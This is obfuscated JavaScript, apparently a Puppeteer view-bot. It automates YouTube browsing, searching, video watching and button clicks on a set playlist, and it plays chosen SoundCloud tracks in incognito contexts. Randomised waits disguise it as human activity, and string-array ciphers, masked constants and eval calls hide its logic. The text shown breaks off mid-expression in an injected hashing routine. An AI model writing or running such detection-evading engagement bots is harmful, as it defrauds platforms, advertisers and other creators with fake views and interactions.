const X = b,
  W = c,
  V = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x16ff + -0x1c22 + 0x4 * 0x149))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * 0x20a2 + -0x27c * -0x2 + -0x1 * -0x1baa), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x982 * -0x15 + -0xb321 * 0x1 + -0x1effb * -0x1 + (-0x50e0 * -0x1 + 0x2 * 0x2ff8 + -0x7638) * random()) : await standardWaitForNetIdle(f), await wait(0x621 * 0x6 + 0x4e + -0x4 * 0x463 + (-0x33a0 + -0x3f7 + -0x24f * -0x29) * random()), -0x6 * 0x67b + 0x39 * 0x60 + 0x1183;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x915 + 0x3 * 0xb89 + -0x5fe), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * -0x1bd7 + 0x10fd + 0xadb;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x179d + -0x1e2 + -0x15bb);
    let h = e[f];
    return h;
  }, d(b, c);
}

function a() {
  const bi = [
    '960lvuduwY',
    'uCo/W6zWWQHeWQZdVSo1fa',
    'zK1XuNvFt04Tra',
    's,rm\x20bts,b',
    'Ahr0Chm6lY9NCG',
    'o,moomoo.i',
    'WRNcMspcVqW0WRfkW4ddSW',
    'yxGjna',
    'OHzOmi1b60',
    'W6LlW6LvxCoiDCkQW4BdTq',
    'AxrZCMmVywr2yq',
    'hmk+w35A',
    'WRxcHclcOffTW7eiWO3dNW',
    'CSolvIqsW4GHmSojna',
    'random',
    'AgvHzgvYCW',
    'AgfYzgnVCMuSAa',
    'y1DsA1LVmvmZta'
  ];
  a = function() {
    return bi;
  };
  return a();
}
async function randomWait() {
  return await wait(-0x105d * -0x1 + -0xc53 + -0x52a * -0x3 + (0x2 * 0x2b7 + 0x20d2 + -0x12b8) * random()), -0x441 + 0x1 * 0x415 + 0x2d;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x179d + -0x1e2 + -0x15bb);
    let h = e[f];
    if (c['oDlWTe'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x3 * -0x8b8 + 0x1d88 + -0x6 * 0x90, r, s, t = -0x13 * 0x5 + 0x3 * -0x693 + -0x506 * -0x4; s = m['charAt'](t++); ~s && (r = q % (0x3 * -0x80d + -0x7cd + 0x18 * 0x155) ? r * (-0x8e9 + -0x1 * -0xaac + -0x183) + s : s, q++ % (0x1 * -0x1ddb + 0x18e6 + -0x4f9 * -0x1)) ? o += String['fromCharCode'](-0x1af5 * -0x1 + 0x1 * 0x1ffb + -0x39f1 & r >> (-(0x621 * 0x6 + 0x4e + -0x49 * 0x82) * q & -0x19d0 + -0x1fb + -0x1bd1 * -0x1)) : -0x6 * 0x67b + 0x39 * 0x60 + 0x1182) {
          s = n['indexOf'](s);
        }
        for (let u = -0x915 + 0x3 * 0xb89 + -0x1986, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * -0x1bd7 + 0x10fd + 0xaea))['slice'](-(-0x105d * -0x1 + -0xc53 + -0xac * 0x6));
        }
        return decodeURIComponent(p);
      };
      c['chxlTo'] = i, b = arguments, c['oDlWTe'] = !![];
    }
    const j = e[0x2 * 0x2b7 + 0x20d2 + -0x2640],
      k = f + j,
      l = b[k];
    return !l ? (h = c['chxlTo'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x6 * 0x39a + -0x22d4 + 0x3870, -0x683 * 0x4 + -0x1827 + 0x1 * 0x323a), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x9769 + -0x7 * 0x3197 + -0xd70c * -0x2) * getRandomInt(0x1 * 0x10cb + 0x226d * -0x1 + -0x8d2 * -0x2, -0x1 * -0x20fe + 0x17 * -0xd + -0xb1 * 0x2e), h)), 0xd4c + 0x10 * 0x44 + -0x118b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * -0x1edf + -0x45 * -0x8d + -0x44e0;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1 * 0xf59 + 0x164 * 0x10 + -0x6e6]['split']('\x20');
    for (let k = -0x1275 + 0xbc7 + 0x6ae; k < i['length']; k += -0x6ca + 0x120a + -0x2 * 0x59f)
      j += i[k] * h[i[k + (0x2c * 0x2f + 0x123 * -0x5 + -0x11 * 0x24)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = d,
      R = b,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te'](R(0xb, '5)Ny')))['slice'](-0xa53 + 0x26 * -0xb2 + -0x1 * -0x24c5)['map'](l => Array['from'](l['children']))['flat'](-0xb73 * -0x1 + 0x1a32 + -0x25a4)['map'](l => l['childNodes'][-0x1184 + -0x244f + -0x5 * -0xac4]['childNodes'][0x41 * -0x47 + -0xd76 + 0x1f7d]['childNodes'][-0x3 * -0xbe3 + -0xfb * -0x8 + -0x2b80]['childNodes'][0x16b + 0xef4 + -0xb * 0x17d]['childNodes'][-0x6d * 0x1 + 0x7ed * 0x2 + -0xf6c]);
    var k;
    return (k = j)[Math['floor'](Math[S(0xe)]() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xed * 0x9 + -0x29 * 0x42 + 0x16cf, -0x174c + 0x1 * 0x12df + -0x17f5 * -0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x4fb + -0xe89 * -0x3 + 0x4fe * 0x4);
  const h = await getMaxTime(f),
    i = Math['min']((0x17d00 + -0x15243 + 0x3 * 0x3fe1) * getRandomInt(-0x1a6a * -0x1 + 0x1 * 0x902 + 0x6 * -0x5e7, -0x12a4 * -0x1 + 0x1 * -0x245b + 0xe3 * 0x14), h);
  return await wait(i), -0x2 * 0x976 + 0x149b + -0x56 * 0x5;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xaab * 0x1 + 0x49 * -0x25 + -0x1538 * -0x1]['children'][-0x1 * -0x25c4 + 0x1075 * 0x2 + 0xda * -0x53]['children'][-0x1 * -0x260e + -0x3a1 + -0x226d]['children'][-0x1 * -0xb2 + 0x1929 + 0x19db * -0x1]['children'][0x65 * 0x1f + -0xf8b * -0x1 + -0x1bc6]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x17 * 0xd3 + -0xdad * -0x2 + -0x2e4e;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x179d + -0x1e2 + -0x15bb);
    let h = e[f];
    if (b['FZksGZ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x3 * -0x8b8 + 0x1d88 + -0x6 * 0x90, s, t, u = -0x13 * 0x5 + 0x3 * -0x693 + -0x506 * -0x4; t = n['charAt'](u++); ~t && (s = r % (0x3 * -0x80d + -0x7cd + 0x18 * 0x155) ? s * (-0x8e9 + -0x1 * -0xaac + -0x183) + t : t, r++ % (0x1 * -0x1ddb + 0x18e6 + -0x4f9 * -0x1)) ? p += String['fromCharCode'](-0x1af5 * -0x1 + 0x1 * 0x1ffb + -0x39f1 & s >> (-(0x621 * 0x6 + 0x4e + -0x49 * 0x82) * r & -0x19d0 + -0x1fb + -0x1bd1 * -0x1)) : -0x6 * 0x67b + 0x39 * 0x60 + 0x1182) {
          t = o['indexOf'](t);
        }
        for (let v = -0x915 + 0x3 * 0xb89 + -0x1986, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * -0x1bd7 + 0x10fd + 0xaea))['slice'](-(-0x105d * -0x1 + -0xc53 + -0xac * 0x6));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2 * 0x2b7 + 0x20d2 + -0x2640,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x441 + 0x1 * 0x415 + 0x2c; u < -0x6 * 0x39a + -0x22d4 + 0x3970; u++) {
          p[u] = u;
        }
        for (u = -0x683 * 0x4 + -0x1827 + 0x1 * 0x3233; u < 0xc9e + -0xe * 0x211 + -0x8a8 * -0x2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * 0x10cb + 0x226d * -0x1 + -0x1dd * -0xa), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * -0x20fe + 0x17 * -0xd + -0x1fd3 * 0x1, q = 0xd4c + 0x10 * 0x44 + -0x118c;
        for (let v = -0x1 * -0x1edf + -0x45 * -0x8d + -0x44e0; v < n['length']; v++) {
          u = (u + (-0x1 * 0xf59 + 0x164 * 0x10 + -0x6e6)) % (-0x1275 + 0xbc7 + 0x7ae), q = (q + p[u]) % (-0x6ca + 0x120a + -0x10 * 0xa4), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2c * 0x2f + 0x123 * -0x5 + -0x11 * 0x15)]);
        }
        return t;
      };
      b['UoZcIM'] = m, c = arguments, b['FZksGZ'] = !![];
    }
    const j = e[-0xa53 + 0x26 * -0xb2 + -0x1 * -0x24bf],
      k = f + j,
      l = c[k];
    return !l ? (b['eYboKE'] === undefined && (b['eYboKE'] = !![]), h = b['UoZcIM'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x20 * 0x30 + 0x79d + -0x1 * 0xd39 + (0x1498 + -0x1 * -0x12b8 + -0x271e) * random()
  }), await wait(0x55 * -0xa + 0x2286 + -0x1d40 + (-0x2 * -0xe96 + -0x1c12 + -0x2 * -0x9) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const T = b;
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName'](T(0x9, '$eNu') + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x2696 + 0x3b9 * 0x8 + -0x445c]['childNodes'][0xdc * -0xb + -0x2d * -0x84 + -0xdbf]['childNodes'][-0xe5c + -0x11 * 0x13a + 0x70b * 0x5]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1 * -0x703 + -0x416 * -0x2 + -0x124]['childNodes'][0x1c65 * 0x1 + 0x259a + -0x41ff]['childNodes'][0x810 + 0x5cf * -0x1 + -0x17 * 0x19]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x150c + -0xe5e * -0x2 + 0x31c7 * -0x1),
          r = -0x3aa + 0xd95 + -0x1 * 0x9eb;
        for (let u = 0x6b * 0x13 + -0x25 * -0xc3 + -0x2420; u < q['length']; u += -0x1aba + -0xf1 * 0xa + 0x52a * 0x7)
          r += q[u] * k[q[u + (0x616 * 0x1 + -0xb90 + -0x1 * -0x57b)]];
        return r;
      }(n);
  });
  await wait((0x6573 + 0x5ee + 0xb5 * -0x45) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1a5 * 0xca + -0x34d1 + 0x26b63) * getRandomInt(0x9bf + 0x3 * 0xa6f + -0x290b, -0x1f66 + -0x1 * -0xfad + 0xfc3), h + (-0x1573 * -0x1 + 0x59 * 0x29 + -0x102c));
  return await wait(i), -0x1a87 * 0x1 + -0x1196 + 0x2c1e;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1a60 + -0xaa + 0x1b0a * 0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2a1 * -0x3 + 0x103a + 0x5 * 0xad + (0x1bb * 0xd + -0x31 * -0x1d + -0x1824) * Math['random']());
    });
  }, -0x1408 + -0x232d + -0x528d * -0x1);
  await wait(0x49909 + -0x88f73 * 0x1 + 0x88a4a);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1b * -0x879 + 0x10277 + -0x2 * -0x6656) * getRandomInt(0x8 * 0x88 + 0x21a4 + -0xca0 * 0x3, 0x1 * 0x21d5 + 0x254e + -0x2 * 0x2385)), clearInterval(h), 0xe00 + 0x24ca + -0x32c9;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x14ef * -0x1 + -0xdb2 + -0x3d9 * -0x9;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x14cb + 0x19b7 + -0x2e81;
    await randomWait();
  }
  return 0x2 * 0xd65 + -0x653 + -0x61 * 0x36;
}

function fetchRandomSC() {
  return Math['random']() <= 0x204 + -0x4 * -0x143 + -0x710 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x35 * 0x43 + 0x23f0 + -0x31cf + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xde5 + 0xf07 * -0x2 + -0x3 * -0x563 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1 * -0x2426 + -0x1b87 + -0x89f;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1524d + 0x24 * -0x48 + 0x1 * 0x20c35 + getRandomInt(-0xb * -0xa9f + -0xa52 * -0xa + -0xa171, 0xd656 + 0x7c3f * 0x1 + -0xdd65));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x6b * -0x24 + -0xa1 * 0x2b + -0xc0 * -0x10), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x19f1 * -0x1 + 0x752 + -0x3 * -0x635;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x19f2 + 0x8 * -0x4b5 + 0xbb6, 0x56 * 0x32 + -0x141d + -0x383 * -0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x25f4 + 0x462 + -0x2286 + floor((-0x1a96 + 0x1 * -0x242 + 0x20c0) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x72426b6e + -0x26eba8a * -0x19 + -0x33a8 * 0xe949),
          -0x1 * 0x228989 + 0x6f4372 + -0x3f1b3 * -0xd,
          0xdd6e + 0xcd6e + -0x12adc,
          -0x1 * 0x159 + 0x5d0 + 0x7 * -0x91
        ], y = [
          -0x1fb9 + 0xdf0 + 0x11e1,
          0x622 * 0x5 + 0x152c + -0x33c6,
          0x11e3 + 0x1 * -0x4d5 + 0x683 * -0x2,
          -0x1 * 0x467 + 0xeff * 0x1 + 0x1 * -0xa98
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x5de + 0x3ed + 0xf9 * 0x2)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1565 * -0x1 + 0x2182 + -0x36e7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const U = b;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, U(0x7, 'Dr*x'))['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x2e0 * -0x3 + -0x56e * -0x3 + 0x1 * -0x18ea) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x13ff + -0x42e + 0x182d] = A[0x1c58 + 0x967 + 0x1 * -0x25af] = A[-0x207 * -0xb + 0x20f * 0xd + -0x310f] = A[0x1bb + 0x82b + -0x9e4 * 0x1] = A[-0x1ea3 + -0x10e3 + 0x2f89 * 0x1] = A[-0x2e * 0x3 + 0xd45 + -0xcb7] = A[-0x2e * -0x81 + 0x1 * 0xab5 + 0xf * -0x242] = A[-0x1717 + 0x119 * 0x7 + 0xf6e] = A[-0x16 * 0x151 + -0xd5f + -0x2a5c * -0x1] = A[0x1226 + -0x1 * -0x1582 + 0x13d * -0x20] = A[0x6 * 0x531 + -0x17c3 * 0x1 + -0x75a] = A[0x1810 + -0xb5 * -0x1b + 0x1 * -0x2b1d] = A[-0x476 * -0x4 + 0x1285 + -0x2452] = A[0x22db + -0x11ed + 0x1 * -0x10e2] = A[0x1ebb * 0x1 + 0x1b62 + 0x1 * -0x3a10] = A[-0x61b + 0x24fc + -0x1ed3 * 0x1] = A[0x199e + 0x1d3b * 0x1 + -0x36ca] = 0x1dd1 + -0x214a * -0x1 + -0x9 * 0x703, this['blocks'] = A) : this['blocks'] = [
                0x2 * 0x21e + -0x128d + 0xe51,
                -0xa93 + -0x8be * 0x2 + 0x28d * 0xb,
                0x1 * -0x1499 + 0x4dd + 0xfbc,
                0x17e + -0x8 * -0x271 + -0x1a * 0xcf,
                0x1 * 0x1aac + -0x2054 + -0x5a8 * -0x1,
                0xe5b + 0x1c4f + -0x2aaa,
                -0x942 + 0x44f * -0x1 + 0x17 * 0x97,
                -0x53c + -0x1170 + 0x16ac * 0x1,
                0x8e3 + -0x15ed + -0xd0a * -0x1,
                0x79e + 0x1fae + -0x274c,
                -0x3 * -0x458 + -0xf8c + 0xa1 * 0x4,
                -0x7 * -0x4ff + 0x8a + -0x2383,
                -0xf57 + 0x1fd3 + -0x107c,
                -0x35 * -0x1 + 0x2642 * 0x1 + 0x1 * -0x2677,
                0x1 * -0x23dd + 0x2206 + 0x1d7,
                0xb8d + 0x1ca + 0x5 * -0x2ab,
                0x256c + 0x3 * 0xba1 + -0x484f
              ], this['h0'] = -0x13 * -0x4a25862 + -0x61486327 + -0x2 * -0x38407b71, this['h1'] = 0xb42b740a + 0x503 * 0x1a5d3f + -0x487f1b3e, this['h2'] = 0x186573 * 0x20b + -0x4296d939 * 0x1 + 0x3 * 0x387e26c2, this['h3'] = 0x1ead * 0x843 + 0x1eb04a84 + -0x130e069 * 0xd, this['h4'] = 0xc93f149d + -0x152267d5e + 0x14cba4ab1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x64 * 0x56 + -0xda5 * -0x1 + -0x3 * 0xfbf, this['finalized'] = this['hashed'] = -0x8db * -0x3 + 0x5d * 0x21 + -0x149 * 0x1e, this['first'] = 0x21b * 0xb + 0x5cf * -0x2 + -0xb8a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x3c4 + -0x1 * -0x20f6 + -0x24ba, O = J['length'] || 0x756 * -0x2 + -0x214f * -0x1 + -0x12a3, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1849 + 0x10f * 0x1 + -0xb9d * -0x2, P[-0x1e60 + 0x14ad + 0x9b3] = this['block'], P[0x116b + 0x5db + 0x2 * -0xb9b] = P[-0xd74 + -0x301 * 0x6 + -0x1f7b * -0x1] = P[0x1009 * -0x1 + 0x1049 + -0x2 * 0x1f] = P[-0x3 * 0x57a + 0x4 * 0x51b + -0x3fb] = P[-0x8 * 0x98 + 0x42d + 0x97] = P[0x86d * -0x2 + 0x236f + -0x1290] = P[0xb92 + 0x1 * 0xb8d + -0x1719] = P[0x1973 * -0x1 + 0x1e1c + -0x2 * 0x251] = P[0x166d * 0x1 + 0x82 * -0x2d + 0x75 * 0x1] = P[-0x1cfc + -0x5ad + 0x22b2] = P[0x400 * -0x2 + -0x19d6 + 0x21e0] = P[0x1 * 0x17a5 + -0x46 * -0x34 + -0xce * 0x2f] = P[0x22c1 + 0x2491 + -0x4746] = P[-0x12f4 * -0x1 + 0x2 * 0x1000 + -0x32e7] = P[0x2b * 0x5b + -0x377 * -0xa + 0x1 * -0x31e1] = P[0xf2 * -0x22 + 0x238b + -0x358] = 0xa5d + -0x1ea * 0x3 + -0x49f), K) {
                    for (N = this['start']; M < O && N < 0x1d0d + -0x5f8 + -0x16d5; ++M)
                      P[N >> 0x130a + 0x4a1 * -0x7 + 0xd5f] |= J[M] << y[0xa * -0x19f + -0x4c1 + -0x14fa * -0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x220e + 0x1008 * -0x2 + -0x1be; ++M)
                      (L = J['charCodeAt'](M)) < -0x1 * -0x12d7 + 0x11b6 * 0x2 + 0x35c3 * -0x1 ? P[N >> -0x2605 + 0x170f + -0x3be * -0x4] |= L << y[-0x8e + 0x1 * 0x6d7 + 0x646 * -0x1 & N++] : L < 0x890 * 0x2 + 0x1 * 0x1ea1 + -0x27c1 ? (P[N >> -0x1964 + -0x110e + 0x2a74] |= (0x21bb + -0xd * -0x17 + -0x2226 | L >> -0x1f57 + 0x2575 + 0xc * -0x82) << y[-0x2e * 0xc5 + -0xc * 0x3d + -0x1 * -0x2645 & N++], P[N >> -0x101 * 0x1e + 0x2 * -0x1309 + 0x2b * 0x196] |= (-0x2182 + -0x4ee + 0x26f * 0x10 | -0xc71 * 0x1 + -0xee3 + 0x931 * 0x3 & L) << y[-0xfa3 * -0x2 + -0x1fab + 0x1 * 0x68 & N++]) : L < -0x1 * 0x1332 + -0x16e5f * 0x1 + -0x25991 * -0x1 || L >= 0x1 * 0x1a450 + 0x1413a + -0x102c5 * 0x2 ? (P[N >> -0x1 * 0x15df + -0x1596 + 0x1 * 0x2b77] |= (0x1 * 0x1daa + -0x31 * 0x71 + -0x729 | L >> 0x4ca * -0x4 + -0x869 * -0x4 + -0xe70) << y[0x8e3 + 0x8 * -0x10 + -0x860 & N++], P[N >> -0xa07 * -0x1 + -0x22ab + 0x277 * 0xa] |= (0x8a9 * -0x3 + 0xb93 * 0x1 + -0x6a * -0x24 | L >> -0x1c8e + -0xe52 * 0x2 + 0x3938 & -0xb9e + 0x40d * 0x4 + 0x65 * -0xb) << y[0x5d + -0xff3 * -0x1 + -0x1 * 0x104d & N++], P[N >> 0x15b1 + -0x3 * -0x9cd + -0x2 * 0x198b] |= (-0xab0 + -0x1a51 + 0x2581 * 0x1 | 0xe69 + -0x1dec + 0x7e1 * 0x2 & L) << y[0x2b6 * 0xc + -0x18aa + 0x1 * -0x7db & N++]) : (L = -0x17f39 + -0xa556 + 0x1 * 0x3248f + ((-0xe03 + -0x161 * 0x1b + -0x373d * -0x1 & L) << -0x1592 + -0x18cb + 0x2e67 | 0x2 * 0x11dd + 0x122 + 0x1 * -0x20dd & J['charCodeAt'](++M)), P[N >> -0x2a4 * -0xa + 0xcd6 + -0x174 * 0x1b] |= (0x1262 + 0x260a + -0x377c | L >> 0x29d * 0x6 + 0x1bd8 + 